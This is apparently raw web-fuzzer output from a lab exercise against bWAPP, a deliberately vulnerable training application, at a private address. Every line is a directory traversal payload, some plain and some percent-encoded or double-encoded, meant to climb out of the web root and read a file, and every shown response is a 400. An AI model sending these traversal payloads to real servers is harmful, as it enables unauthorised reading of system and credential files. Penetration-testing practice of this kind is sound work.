19,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/{FILE}
20,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
21,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
22,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
23,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
24,400,10L,42W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
5,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../{FILE}
6,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../{FILE}
7,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../{FILE}
8,400,10L,42W,http://10.0.2.4/bWAPP//../../../../../../../../{FILE}
3,400,10L,42W,http://10.0.2.4/bWAPP//../../../{FILE}
4,400,10L,42W,http://10.0.2.4/bWAPP//../../../../{FILE}
209,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66{FILE}
208,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66{FILE}
211,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
210,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66..%%32%66{FILE}
213,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
212,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
216,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/{FILE}
215,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
214,400,10L,42W,http://10.0.2.4/bWAPP//..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
219,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
218,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
217,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/{FILE}
220,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
223,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
221,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
222,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
225,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
226,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
224,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65%%32%66{FILE}
230,400,10L,42W,http://10.0.2.4/bWAPP//%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
